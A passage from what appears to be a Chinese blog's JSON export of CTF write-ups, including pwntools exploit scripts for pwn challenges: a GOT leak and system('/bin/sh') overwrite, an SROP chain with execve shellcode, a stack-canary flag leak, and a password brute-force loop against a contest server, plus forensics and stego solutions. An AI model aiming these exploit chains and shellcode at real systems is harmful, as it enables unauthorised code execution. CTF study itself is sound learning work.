p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'ID.'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'123456781234'</span>+payload</div><div class=\"line\">    p.sendline(payload.ljust(<span class=\"number\">0x15</span>, <span class=\"string\">'1'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printname</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name:'</span>)</div><div class=\"line\">    p.recv(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printlogo</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upmem</span><span class=\"params\">(num)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    p.sendline(str(num))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upname</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.send(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(address)</span>:</span></div><div class=\"line\">    upid(p32(address))</div><div class=\"line\">    printname()</div><div class=\"line\">    data = p.recv(<span class=\"number\">4</span>)</div><div class=\"line\">    log.info(<span class=\"string\">\"%#x =&gt; %s\"</span> % (address, data))</div><div class=\"line\">    <span class=\"keyword\">return</span> data</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">(p)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id'</span>)</div><div class=\"line\">    p.send(<span class=\"string\">'12345678'</span>)</div><div class=\"line\">    printlogo()</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    d = DynELF(leak, elf=ELF('./pwn3'))</span></div><div class=\"line\"><span class=\"comment\">#    system_addr = d.lookup('system', 'libc')</span></div><div class=\"line\"><span class=\"comment\">#    print system_addr</span></div><div class=\"line\"></div><div class=\"line\">    upid(p32(atoi_got))</div><div class=\"line\">    printname()</div><div class=\"line\">    atoi_addr = u32(p.recv(<span class=\"number\">4</span>)) - <span class=\"number\">0xa000000</span></div><div class=\"line\">    <span class=\"keyword\">print</span> hex(atoi_addr)</div><div class=\"line\"></div><div class=\"line\">    </div><div class=\"line\">    upid(p32(fgets_got))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    printname()</div><div class=\"line\">    <span class=\"keyword\">print</span> hex(u32(p.recv(<span class=\"number\">4</span>)))</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'atoi_addr =&gt; '</span>, hex(atoi_addr) </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    libc.address = atoi_addr - libc.symbols['atoi']</span></div><div class=\"line\"><span class=\"comment\">#    print 'libc.address =&gt; ', hex(libc.address)</span></div><div class=\"line\"><span class=\"comment\">#    system_addr = libc.symbols['system']</span></div><div class=\"line\"><span class=\"comment\">#    print 'dis libc =&gt; ', hex(atoi_addr - libc.address)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    print 'distance', hex(system_addr - atoi_addr)</span></div><div class=\"line\">    </div><div class=\"line\">    system_addr = atoi_addr + <span class=\"number\">0xf030</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    upmem(<span class=\"number\">5</span>)</div><div class=\"line\">    upname(p32(system_addr))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'=&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    p,libc = makeio()</div><div class=\"line\">    pwn(p)</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a>pwn4</h2><p>360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。<br>当初写的脚本找不到了，网上找了一个。</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*-coding:utf-8-*-</span></div><div class=\"line\"><span class=\"attr\">__author__</span> = 'joker'</div><div class=\"line\">from pwn <span class=\"built_in\">import</span> *</div><div class=\"line\">context.<span class=\"attr\">log_level</span> = <span class=\"string\">\"debug\"</span></div><div class=\"line\">context.<span class=\"attr\">arch</span> = <span class=\"string\">\"amd64\"</span></div><div class=\"line\"><span class=\"comment\">#r = process(\"./pwn4\")</span></div><div class=\"line\"><span class=\"attr\">r</span> = remote('<span class=\"number\">106.75</span>.<span class=\"number\">66.195</span>', <span class=\"number\">11006</span>)</div><div class=\"line\"><span class=\"attr\">syscall_addr</span> = <span class=\"number\">0</span>x4000BE</div><div class=\"line\"><span class=\"attr\">start_addr</span> = <span class=\"number\">0</span>x4000B0</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(start_addr)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(start_addr)<span class=\"comment\">#fill</span></div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"comment\">#write infor leak</span></div><div class=\"line\">r.send(<span class=\"string\">\"\\xb3\"</span>)<span class=\"comment\">#write 2 start_addr last byte</span></div><div class=\"line\"><span class=\"attr\">data</span> = r.recv(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"attr\">data</span> = r.recv(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"attr\">stack_addr</span> = u64(data) - <span class=\"number\">0</span>xa00</div><div class=\"line\">print <span class=\"string\">\"[*]:stack:&#123;0&#125;\"</span>.format(hex(stack_addr))</div><div class=\"line\"><span class=\"attr\">frame</span> = SigreturnFrame()</div><div class=\"line\">frame.<span class=\"attr\">rax</span> = constants.SYS_read</div><div class=\"line\">frame.<span class=\"attr\">rdi</span> = <span class=\"number\">0</span></div><div class=\"line\">frame.<span class=\"attr\">rsi</span> = stack_addr</div><div class=\"line\">frame.<span class=\"attr\">rdx</span> = <span class=\"number\">0</span>x300</div><div class=\"line\">frame.<span class=\"attr\">rsp</span> = stack_addr</div><div class=\"line\">frame.<span class=\"attr\">rip</span> = syscall_addr</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(syscall_addr)</div><div class=\"line\">payload += str(frame)</div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\"><span class=\"attr\">payload</span> = payload[:<span class=\"number\">15</span>]</div><div class=\"line\">r.send(payload)<span class=\"comment\">#set rax=sys_rt_sigreturn</span></div><div class=\"line\"><span class=\"attr\">frame</span> = SigreturnFrame()</div><div class=\"line\">frame.<span class=\"attr\">rax</span> = constants.SYS_mprotect</div><div class=\"line\">frame.<span class=\"attr\">rdi</span> = (stack_addr&amp;<span class=\"number\">0</span>xfffffffffffff000)</div><div class=\"line\">frame.<span class=\"attr\">rsi</span> = <span class=\"number\">0</span>x1000</div><div class=\"line\">frame.<span class=\"attr\">rdx</span> = <span class=\"number\">0</span>x7</div><div class=\"line\">frame.<span class=\"attr\">rsp</span> = stack_addr + <span class=\"number\">0</span>x108</div><div class=\"line\">frame.<span class=\"attr\">rip</span> = syscall_addr</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(start_addr)</div><div class=\"line\">payload += p64(syscall_addr)</div><div class=\"line\">payload += str(frame)</div><div class=\"line\">payload += p64(stack_addr + <span class=\"number\">0</span>x108 + <span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"comment\">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></div><div class=\"line\">payload += <span class=\"string\">\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"</span><span class=\"comment\">#shellcode</span></div><div class=\"line\">r.send(payload)</div><div class=\"line\"><span class=\"attr\">payload</span> = p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\">payload += p64(<span class=\"number\">0</span>x4000B3)<span class=\"comment\">#fill</span></div><div class=\"line\"><span class=\"attr\">payload</span> = payload[:<span class=\"number\">15</span>]</div><div class=\"line\">r.send(payload)<span class=\"comment\">#set rax=sys_rt_sigreturn</span></div><div class=\"line\">r.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a>pwn5</h2><p>老套路了。。将环境变量中文件名的指针覆盖为flag的地址，<code>__stack_chk_fail</code>时候输出即可。</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./pwnsss'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>, <span class=\"number\">10003</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'something\\n'</span>)</div><div class=\"line\">    payload = p32(<span class=\"number\">0x0804a080</span>) * <span class=\"number\">300</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    print p.recvline()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div></pre></td></tr></table></figure>"},{"title":"2017看雪秋季赛整理","date":"2017-11-16T00:24:03.000Z","_content":"\n## 3\n\n作者原思路:\n> 简单迷宫：\n从头走到尾即可，q上z下p左l右\n将路径字符串采用morse码编码，将morse码采用base64编码两次，得到第一部分结果；\n将morse码采用sm3算法Hash，得到的部分作为第二部分结果。\n\n但事实上看了一下，很多很多地方加了反调试，但是退出函数都一样，导致直接patch可过。这题学习反调试不错。迷宫函数很迷，不知道在干嘛。。base64decode也很容易看出来，morse不熟悉，但是看出是替换函数也一样。\n\n## 4\n\n常规pwn题。","source":"_posts/2017看雪秋季赛整理.md","raw":"---\ntitle: 2017看雪秋季赛整理\ntags:\n  - writeup\ncategories: []\ndate: 2017-11-16 08:24:03\n---\n\n## 3\n\n作者原思路:\n> 简单迷宫：\n从头走到尾即可，q上z下p左l右\n将路径字符串采用morse码编码，将morse码采用base64编码两次，得到第一部分结果；\n将morse码采用sm3算法Hash，得到的部分作为第二部分结果。\n\n但事实上看了一下，很多很多地方加了反调试，但是退出函数都一样，导致直接patch可过。这题学习反调试不错。迷宫函数很迷，不知道在干嘛。。base64decode也很容易看出来，morse不熟悉，但是看出是替换函数也一样。\n\n## 4\n\n常规pwn题。","slug":"2017看雪秋季赛整理","published":1,"updated":"2017-11-17T02:07:15.745Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxt000mhv18j5lgwfix","content":"<h2 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h2><p>作者原思路:</p>\n<blockquote>\n<p>简单迷宫：<br>从头走到尾即可，q上z下p左l右<br>将路径字符串采用morse码编码，将morse码采用base64编码两次，得到第一部分结果；<br>将morse码采用sm3算法Hash，得到的部分作为第二部分结果。</p>\n</blockquote>\n<p>但事实上看了一下，很多很多地方加了反调试，但是退出函数都一样，导致直接patch可过。这题学习反调试不错。迷宫函数很迷，不知道在干嘛。。base64decode也很容易看出来，morse不熟悉，但是看出是替换函数也一样。</p>\n<h2 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h2><p>常规pwn题。</p>\n","excerpt":"","more":"<h2 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h2><p>作者原思路:</p>\n<blockquote>\n<p>简单迷宫：<br>从头走到尾即可，q上z下p左l右<br>将路径字符串采用morse码编码，将morse码采用base64编码两次，得到第一部分结果；<br>将morse码采用sm3算法Hash，得到的部分作为第二部分结果。</p>\n</blockquote>\n<p>但事实上看了一下，很多很多地方加了反调试，但是退出函数都一样，导致直接patch可过。这题学习反调试不错。迷宫函数很迷，不知道在干嘛。。base64decode也很容易看出来，morse不熟悉，但是看出是替换函数也一样。</p>\n<h2 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h2><p>常规pwn题。</p>\n"},{"title":"8月打工手记","date":"2017-07-28T03:09:32.000Z","_content":"\n## 2017/7/25\n\n来这边第一天。\n\n## 2017/7/28\n\n等下稍微总结下近几天的概况吧。","source":"_posts/8月打工手记.md","raw":"---\ntitle: 8月打工手记\ntags:\n  - life\ncategories: []\ndate: 2017-07-28 11:09:32\n---\n\n## 2017/7/25\n\n来这边第一天。\n\n## 2017/7/28\n\n等下稍微总结下近几天的概况吧。","slug":"8月打工手记","published":1,"updated":"2017-07-28T03:10:43.691Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxv000phv18vaqbfbop","content":"<h2 id=\"2017-7-25\"><a href=\"#2017-7-25\" class=\"headerlink\" title=\"2017/7/25\"></a>2017/7/25</h2><p>来这边第一天。</p>\n<h2 id=\"2017-7-28\"><a href=\"#2017-7-28\" class=\"headerlink\" title=\"2017/7/28\"></a>2017/7/28</h2><p>等下稍微总结下近几天的概况吧。</p>\n","excerpt":"","more":"<h2 id=\"2017-7-25\"><a href=\"#2017-7-25\" class=\"headerlink\" title=\"2017/7/25\"></a>2017/7/25</h2><p>来这边第一天。</p>\n<h2 id=\"2017-7-28\"><a href=\"#2017-7-28\" class=\"headerlink\" title=\"2017/7/28\"></a>2017/7/28</h2><p>等下稍微总结下近几天的概况吧。</p>\n"},{"title":"AlexCTF writeup","date":"2017-02-06T17:29:01.000Z","_content":"\n先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。\n再吐槽下这个比赛，脑洞奇大= =\n\n## Trivia\n\n### TR1: Hello there\n\n认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。\n顶部就是Flag\n\n`#alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck}`\n\n## Forensics\n\n### fore1: hit the core\n\n`strings`看一下，发现了一串字符串\n\n```\ncvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}\n```\n\n然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag\n\n```\nstrings ='''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}'''\nflag = ''\nfor i in range(len(strings)):\n    if i % 5 == 0:\n        flag += strings[i]\nprint flag\n```\n\nflag`ALEXCTF{K33P_7H3_g00D_w0rk_up}`\n\n### fore2: mail client\n\n看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法\n最终结果是`ALEXCTF{Mu77_Th3_CoRe}`\n代码：\n\n```\nfrom pwn import *\n\nf = open('string', 'r')\nlines = f.readlines()\n\nfor i in lines:\n    p = remote('195.154.53.62', 2222)\n    p.recvuntil('Email:')\n    p.sendline('alexctf@example.com')\n    p.recvuntil('Password:')\n    print i\n    p.sendline(i)\n    flag = p.recvline()\n    if 'Invalid' in flag:\n        p.close()\n        continue\n    else:\n        print flag\n        p.interactive()\n```\n\n`Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge  noejne`就是strings了core下\n\n### fore3: usb probing\n\nusb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到\n\n`ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB}`\n\n### fore4: unknown format\n\n里面有一个`.SP01`文件，上网查一下，是kindle的升级包。网上还有一个`kindletool`的工具，可以从这种包中打包和提取文件。\n\n[Kindletool](https://github.com/NiLuJe/KindleTool)\n\n使用过程如下：\n\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ ./kindletool dm out flag\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ file flag\nflag: data\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk flag \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n254           0xFE            gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49\n\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk -e flag \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n254           0xFE            gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49\n\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ ls\nflag  _flag.extracted  kindletool  out  usb_sniff.pcap\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ cd _flag.extracted/ && ls\nFE  FE.gz\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ tar -zxvf FE.gz\nkindle_out/\nkindle_out/rootfs_md5_list.tar.gz\nkindle_out/2540270001-2692310002.ffs\nkindle_out/flag.txt\nkindle_out/update-patches.tar.gz\n\ngzip: stdin: unexpected end of file\ntar: Unexpected EOF in archive\ntar: Unexpected EOF in archive\ntar: Error is not recoverable: exiting now\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ ls\nFE  FE.gz  kindle_out\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ cd kindle_out/\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ ls\n2540270001-2692310002.ffs  flag.txt  rootfs_md5_list.tar.gz  update-patches.tar.gz\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ cat flag.txt \nALEXCTF{Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3}\n```\n\n## Scripting\n\n## Script2\n\n找到原图。。比较一下，排除噪音，有不同的地方。\n\n![1.jpg](AlexCTF-writeup/1.png)\n\n原图：\n\n![2.png](AlexCTF-writeup/2.png)\n\n下面引用别人的答案：\n\n> Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals:\n\n> If we print out the x values of these pixels, we get:\n\n> 4 17 36 60 68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125\n\n> Or in hex:\n\n> 04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d\n\n> Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex?\n\n> 414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d\n\n> That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}.\n\nflag.py\n\n ```\nimport binascii\nfrom PIL import Image\n\nnew = Image.open('cat_with_secrets.png').load()\nold = Image.open('cat_with_secrets_original.jpg').load()\n\nwidth = 512\n\nin_hex = ''\n\nfor y in range(3):\n    for x in range(width):\n        if (y, x) <= (2, 125) and new[x, y] != old[x, y]:\n            in_hex += '%x' % (x % 16)\n\nprint(binascii.unhexlify(in_hex))\n```\n\n当然了简单的方法，`pip install steganography`，然后run`steganography -d cat-with-secrets.png`","source":"_posts/AlexCTF-writeup.md","raw":"---\ntitle: AlexCTF writeup\ntags:\n  - writeup\ncategories: []\ndate: 2017-02-07 01:29:01\n---\n\n先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。\n再吐槽下这个比赛，脑洞奇大= =\n\n## Trivia\n\n### TR1: Hello there\n\n认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。\n顶部就是Flag\n\n`#alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck}`\n\n## Forensics\n\n### fore1: hit the core\n\n`strings`看一下，发现了一串字符串\n\n```\ncvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}\n```\n\n然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag\n\n```\nstrings ='''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}'''\nflag = ''\nfor i in range(len(strings)):\n    if i % 5 == 0:\n        flag += strings[i]\nprint flag\n```\n\nflag`ALEXCTF{K33P_7H3_g00D_w0rk_up}`\n\n### fore2: mail client\n\n看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法\n最终结果是`ALEXCTF{Mu77_Th3_CoRe}`\n代码：\n\n```\nfrom pwn import *\n\nf = open('string', 'r')\nlines = f.readlines()\n\nfor i in lines:\n    p = remote('195.154.53.62', 2222)\n    p.recvuntil('Email:')\n    p.sendline('alexctf@example.com')\n    p.recvuntil('Password:')\n    print i\n    p.sendline(i)\n    flag = p.recvline()\n    if 'Invalid' in flag:\n        p.close()\n        continue\n    else:\n        print flag\n        p.interactive()\n```\n\n`Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge  noejne`就是strings了core下\n\n### fore3: usb probing\n\nusb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到\n\n`ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB}`\n\n### fore4: unknown format\n\n里面有一个`.SP01`文件，上网查一下，是kindle的升级包。网上还有一个`kindletool`的工具，可以从这种包中打包和提取文件。\n\n[Kindletool](https://github.com/NiLuJe/KindleTool)\n\n使用过程如下：\n\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ ./kindletool dm out flag\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ file flag\nflag: data\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk flag \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n254           0xFE            gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49\n\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk -e flag \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n254           0xFE            gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49\n\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ ls\nflag  _flag.extracted  kindletool  out  usb_sniff.pcap\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ cd _flag.extracted/ && ls\nFE  FE.gz\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ tar -zxvf FE.gz\nkindle_out/\nkindle_out/rootfs_md5_list.tar.gz\nkindle_out/2540270001-2692310002.ffs\nkindle_out/flag.txt\nkindle_out/update-patches.tar.gz\n\ngzip: stdin: unexpected end of file\ntar: Unexpected EOF in archive\ntar: Unexpected EOF in archive\ntar: Error is not recoverable: exiting now\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ ls\nFE  FE.gz  kindle_out\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ cd kindle_out/\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ ls\n2540270001-2692310002.ffs  flag.txt  rootfs_md5_list.tar.gz  update-patches.tar.gz\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ cat flag.txt \nALEXCTF{Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3}\n```\n\n## Scripting\n\n## Script2\n\n找到原图。。比较一下，排除噪音，有不同的地方。\n\n![1.jpg](AlexCTF-writeup/1.png)\n\n原图：\n\n![2.png](AlexCTF-writeup/2.png)\n\n下面引用别人的答案：\n\n> Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals:\n\n> If we print out the x values of these pixels, we get:\n\n> 4 17 36 60 